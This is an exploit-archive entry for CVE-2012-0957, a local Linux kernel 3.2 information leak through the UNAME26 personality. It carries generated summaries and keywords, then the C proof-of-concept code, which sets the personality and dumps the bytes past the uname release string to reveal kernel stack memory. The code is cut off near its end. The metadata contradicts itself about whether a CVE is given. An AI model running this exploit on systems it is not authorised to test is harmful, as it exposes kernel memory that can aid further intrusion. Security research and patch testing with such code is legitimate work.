// #<-- Publish Date --># // 2012-10-09 // #<-- Technical Document Summary (TDS) --># // The technical mechanism involves a function that prints each character of the system's release string and detects non‑null bytes to determine leaked data. The vulnerability is a local information‑disclosure issue in the Linux kernel where the uname kernel stack may be exposed. This weakness resides in the kernel’s handling of the UNAME26 personality feature. The exploit consists of invoking the program without requiring elevated privileges to read sensitive kernel information. // #<-- Layman's Document Summary (LDS) --># // A local information‑disclosure flaw lets an attacker see data that should remain hidden, such as the kernel release string. This allows an attacker to gather details about the system environment, which could aid further attacks. The affected component is the Linux kernel’s uname implementation and its personality subsystem. // #<-- Key Words (KW) --># // Linux kernel, uname, UNAME26, information disclosure, local vulnerability, kernel stack leak, personality function, syscall, release string, security focus, CVE-2012-0957 // #<-- Related Terms --># // information disclosure, local privilege escalation, kernel exploit, system call, personality subsystem, uname function, Linux kernel 3.2 // #<-- Entities/Attributes --># // Software: Linux kernel // Version: 3.2.x // Function: dump_uts, personality // System call: uname // Error code: Not specified in source // CVE identifier: Not specified in source // #<-- Vulnerability Type --># // Not specified in source // #<-- Original Content --># /* source: https://www.securityfocus.com/bid/55855/info The Linux kernel is prone to a local information-disclosure vulnerability. Local attackers can exploit this issue to obtain sensitive information that may lead to further attacks. */ /* Test for UNAME26 personality uname kernel stack leak. * Copyright 2012, Kees Cook <keescook@chromium.org> * License: GPLv3 */ #include <stdio.h> #include <stdlib.h> #include <string.h> #include <errno.h> #include <unistd.h> #include <sys/personality.h> #include <sys/utsname.h> #define UNAME26 0x0020000 int dump_uts(void) { int i, leaked = 0; struct utsname buf = { }; if (uname(&buf)) { perror("uname"); exit(1); } printf("%s
", buf.release); for (i = strlen(buf.release) + 1; i < sizeof(buf.release); i++) { unsigned char c = (unsigned char)buf.release[i]; printf("%02x", c); if (c) leaked = 1; } printf("
"); return leaked ? (i - (strlen(buf.release) + 1)) : 0; } int main(int ac, char **av) { int leaked; leaked = dump_uts(); if (leaked) { printf("Leaked %d bytes even without UNAME26!?
", leaked); return 1; } if (personality(PER_LINUX | UNAME26) < 0) { perror("personality"); exit(1); } leaked = dump_uts(); if (leaked) { printf("Leaked %d bytes!
